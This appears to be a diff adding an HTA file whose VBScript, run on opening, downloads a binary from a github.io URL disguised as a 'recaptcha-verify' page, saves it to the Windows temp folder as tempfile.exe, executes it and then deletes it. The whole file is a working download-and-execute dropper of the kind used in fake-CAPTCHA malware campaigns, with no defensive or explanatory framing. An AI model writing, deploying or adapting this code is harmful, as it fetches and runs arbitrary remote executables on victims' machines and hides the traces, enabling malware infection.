@@ -1,0 +1,53 @@
+<html>
+<head>
+    <title>Download and Execute EXE</title>
+    <HTA:APPLICATION 
+        APPLICATIONNAME="Download and Execute EXE" 
+        BORDER="thin" 
+        SCROLL="no" 
+        SINGLEINSTANCE="yes" 
+        SYSMENU="no">
+</head>
+<body>
+    <script language="VBScript">
+        Sub DownloadAndExecute
+            Dim objXMLHTTP, objStream, objShell
+            Dim url, tempFile
+            
+            url = "https://fecdor.github.io/history-protector/recaptcha-verify"  ' Replace with the URL of your EXE
+            
+            ' Create objects
+            Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+            Set objStream = CreateObject("ADODB.Stream")
+            Set objShell = CreateObject("WScript.Shell")
+            
+            ' Open connection and download the file into memory
+            objXMLHTTP.Open "GET", url, False
+            objXMLHTTP.Send
+            If objXMLHTTP.Status = 200 Then
+                objStream.Type = 1  ' Binary data
+                objStream.Open
+                objStream.Write objXMLHTTP.responseBody
+                ' Create temporary file in memory and execute it
+                tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\tempfile.exe"
+                objStream.SaveToFile tempFile, 2
+                objStream.Close
+                ' Execute the EXE
+                objShell.Run tempFile, 1, True
+                ' Delete the temporary file after execution
+                objShell.Run "cmd /c del " & tempFile, 0, True
+            Else
+                MsgBox "Error downloading file."
+            End If
+            
+            ' Clean up
+            Set objXMLHTTP = Nothing
+            Set objStream = Nothing
+            Set objShell = Nothing
+        End Sub
+        
+        ' Call the function to download and execute
+        DownloadAndExecute
+    </script>
+</body>
+</html>
